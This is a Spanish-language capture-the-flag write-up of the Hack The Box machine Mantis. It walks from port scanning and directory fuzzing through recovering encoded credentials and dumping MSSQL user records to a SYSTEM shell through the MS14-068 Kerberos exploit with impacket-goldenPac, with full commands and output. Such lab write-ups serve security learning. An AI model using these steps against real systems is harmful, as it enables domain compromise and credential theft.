---
layout: single
title: Mantis HTB - WriteUp
excerpt: WriteUp de la máquina Mantis de HTB.
date: 2023-02-22
classes: wide
header:
  teaser: /assets/images/Mantis/Mantis.png
  teaser_home_page: true
  icon: /assets/images/Mantis/Mantis.png
categories:
  - infosec
tags:
  - ctf
  - Windows                                                                                                                                                                                 
  - Writeup
  - Web_Enumeration                                                                                                                                                                                  
  - MSSQL                                                                                                                                                                                    
  - Kerberos
---


Hoy estaremos tocando la máquina Mantis de HTB. En ella Se toca Active Directory

### Enumeración Inicial.

Lo primero será escanear los puertos del host, de esta forma veremos si tiene servicios expuestos.

```bash
# Nmap 7.91 scan initiated Wed Feb 22 17:51:35 2023 as: nmap -sC -sV -Pn -oN Extraction -p53,88,135,139,389,445,464,593,636,1337,1433,3268,3269,5722,8080,9389,49152,49153,49154,49155,49157,49158,49161,49165,50255,61546 10.10.10.52
Nmap scan report for 10.10.10.52
Host is up (0.11s latency).
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-02-22 16:51:51Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1337/tcp  open  http         Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: MANTIS
|   DNS_Domain_Name: htb.local
|   DNS_Computer_Name: mantis.htb.local
|   DNS_Tree_Name: htb.local
|_  Product_Version: 6.1.7601
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-02-22T16:50:02
|_Not valid after:  2053-02-22T16:50:02
|_ssl-date: 2023-02-22T16:52:58+00:00; +10s from scanner time.
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc        Microsoft Windows RPC
8080/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Tossed Salad - Blog
9389/tcp  open  mc-nmf       .NET Message Framing
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc        Microsoft Windows RPC
49161/tcp open  msrpc        Microsoft Windows RPC
49165/tcp open  msrpc        Microsoft Windows RPC
50255/tcp open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: MANTIS
|   DNS_Domain_Name: htb.local
|   DNS_Computer_Name: mantis.htb.local
|   DNS_Tree_Name: htb.local
|_  Product_Version: 6.1.7601
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-02-22T16:50:02
|_Not valid after:  2053-02-22T16:50:02
|_ssl-date: 2023-02-22T16:52:58+00:00; +10s from scanner time.
61546/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 43m01s, deviation: 1h53m24s, median: 9s
| ms-sql-info: 
|   10.10.10.52:1433: 
|     Version: 
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: mantis
|   NetBIOS computer name: MANTIS\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: mantis.htb.local
|_  System time: 2023-02-22T11:52:49-05:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-02-22T16:52:48
|_  start_date: 2023-02-22T16:49:52

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb 22 17:52:51 2023 -- 1 IP address (1 host up) scanned in 76.65 seconds
```

Podemos ver que nos estamos enfrentando ante un Windows Server 2008 R2 Standard y que el  nombre del dominio es htb.local. Lo meteré en /etc/hosts de mi máquina.

El servidor no tiene carpetas compartidas para un usuario anonimo ni tampoco admite sesiones nulas por RPC.

Estaban expuestos dos servicios web. Uno en el puerto 8080 (orchad cms) y otro en el 1337 (IIS7)

La máquina tiene algun rabbit hole. Si Fuzzeamos directorios en el IIS7 podemos encontrar el siguiente directorio:

```bash
❯ gobuster dir -t 30 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://10.10.10.52:1337/
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.52:1337/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/02/22 17:57:30 Starting gobuster in directory enumeration mode
===============================================================
/orchard              (Status: 500) [Size: 3026]
/secure_notes         (Status: 301) [Size: 160] [--> http://10.10.10.52:1337/secure_notes/]
```

El contenido de ese directorio es el siguiente:

```bash
❯ curl -s http://htb.local:1337/secure_notes/ | html2text
****** htb.local - /secure_notes/ ******
===============================================================================
[To_Parent_Directory]

 9/13/2017  4:22 PM          912
dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt
  9/1/2017  9:13 AM          168 web.config
===============================================================================
```

Un archivo web.config que no existe (devuelve un 404) y un archivo con la siguiente información.

```bash
❯ curl -s http://htb.local:1337/secure_notes/dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzMNzMwNzI2NDIx.txt.txt | html2text
1. Download OrchardCMS
2. Download SQL server 2014 Express ,create user "admin",and create orcharddb database
3. Launch IIS and add new website and point to Orchard CMS folder location. 
4. Launch browser and navigate to http://localhost:8080 
5. Set admin password and configure sQL server connection string.
6. Add blog pages with admin user. 

Credentials stored in secure format
OrchardCMS admin creadentials
010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001
SQL Server sa credentials file namez
```

La contraseña en binario es la siguiente -> @dm!n_P@ssW0rd!
Ademas el nombre del archivo tiene una cadena encodeada en b64 y en hexadecimal. Mostrando la siguiente contraseña -> "m$\$ql\_S@\_P@ssW0rd!"

### Explotación

El MSSQL está abierto.  Podemos intentar autenticarnos.

```bash
❯ mssqlclient.py 'HTB/admin:m$$ql_S@_P@ssW0rd!@10.10.10.52'
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (120 7208) 
[!] Press help for extra shell commands
SQL> 
```

Podemos probar si tenemos permisos para activar el xp_cmdshell y ejecutar comandos a nivel de sistema.

```SQL
SQL> sp_configure 'show advanced options', '1'
[-] ERROR(MANTIS\SQLEXPRESS): Line 105: User does not have permission to perform this action.
```

No tenemos permisos... Voy a enumerar la base de datos.

```SQL
SQL> SELECT name FROM master.sys.databases
name                                                                                                                               
--------------------------------------------------------------------------------------------------------------------------------   
master                                                                                                                             
tempdb                                                                                                                             
model                                                                                                                              
msdb                                                                                                                               
orcharddb       
```

Voy a enumerar la base de datos orcharddb, podemos extraer usuarios y contrasesñas . Debido a que el output se muestra regular, lo he separado en dos consultas.

USERS

```SQL
SQL> select username from blog_Orchard_Users_UserPartRecord;
username                                                                                                                                                                                                                                                          

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
admin                                                                                                                                                                                                                                                             
James    
```

PASSWORDS

```SQL
SQL> select password from blog_Orchard_Users_UserPartRecord;
password                                                                                                                                                                                                                                                          
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
AL1337E2D6YHm0iIysVzG8LA76OozgMSlyOJk1Ov5WCGK+lgKY6vrQuswfWHKZn2+A==                                                                                                                                                                                              
J@m3s_P@ssW0rd!
```

La contraseña de james esta en claro. Vamos a probar si es un usuario valido del sistema.

```bash
❯ crackmapexec smb 10.10.10.52 -d htb.local -u james -p 'J@m3s_P@ssW0rd!'
SMB         10.10.10.52     445    MANTIS           [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:MANTIS) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.52     445    MANTIS           [+] htb.local\james:J@m3s_P@ssW0rd! 
```

El usuario es valido, pero no podemos ganar una shell todavía, principalmente porque el winrm no esta abierto.

Tampoco pude realizar un Kerberoasting ni un ASREPRoast (Teniendo credenciales validas puedes enumerar RPC). Voy a usar bloodhound.py para extraer información del dominio.

```bash
❯ python3 bloodhound.py -c ALL -u 'james' -p 'J@m3s_P@ssW0rd!' -d 'htb.local' -ns 10.10.10.52
INFO: Found AD domain: htb.local
INFO: Connecting to LDAP server: mantis.htb.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: mantis.htb.local
INFO: Found 4 users
INFO: Found 41 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: mantis.htb.local
INFO: Done in 00M 11S
```

Ahora con BloodHoundAd podemos ver la información que nos ha extraido. No saqué nada en claro. Despues de no encontrar nada decidí probar si era vulnerable a "MS14-068" Para explotarlo hay varias formas, yo he usado "impacket-goldenPac"

> Para aprovechar el MS14-068, necesitamos una cuenta de usuario asociada válida con el DC y solo la IP del controlador de dominio.

```bash
❯ impacket-goldenPac -dc-ip 10.10.10.52 'htb.local/james:J@m3s_P@ssW0rd!@mantis.htb.local'
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
[-] Couldn´t get forest info ([Errno Connection error (htb.local:445)] [Errno 113] No route to host), continuing
[*] Attacking domain controller 10.10.10.52
[*] 10.10.10.52 found vulnerable!
[*] Requesting shares on mantis.htb.local.....
[*] Found writable share ADMIN$
[*] Uploading file twQbrNmU.exe
[*] Opening SVCManager on mantis.htb.local.....
[*] Creating service qIGx on mantis.htb.local.....
[*] Starting service qIGx.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>
```







